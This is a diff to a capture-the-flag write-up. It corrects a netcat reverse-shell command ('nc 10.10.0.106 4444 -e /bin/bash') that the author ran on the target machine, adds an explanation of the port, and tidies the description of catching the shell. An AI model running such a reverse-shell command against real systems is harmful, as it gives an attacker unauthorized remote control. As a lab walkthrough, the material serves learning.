@@ -66,7 +66,7 @@ Where the flags are:
 In the target machine I typed : 
 
 ```bash
-$ nc 10.10.0.106 -e /bin/bash
+$ nc 10.10.0.106 4444 -e /bin/bash
 ```
 <img src="https://res.cloudinary.com/dxbnpu2rx/image/upload/v1602826824/2_g5fulv.png"/>
 
@@ -74,12 +74,14 @@ Where:
 
 ```
 10.10.0.106 : Was my VPN IP during the ctf
+4444 : port to establish connection
 -e : Program to execute after connection occurs, connecting STDIN and STDOUT 
 to the program
 ```
 #### Step 3
 
-I returned to my local terminal in which the port listener was opened and the first message confused me a bit because of the first message: ```lookup failed```. So, I thought: this didn't work. But when I typed ```id``` command, it returned me the user name and real user id.
+I returned to my local terminal in which the port listener was opened and the first message confused me a bit: ```lookup failed```. So, I thought: this didn't work. But when I typed ```id``` command, it returned me the user name and real user id.
+
 <img src="https://res.cloudinary.com/dxbnpu2rx/image/upload/v1602828118/3_nr8orh.png"/>
 
 At this point to find the flag I just typed:
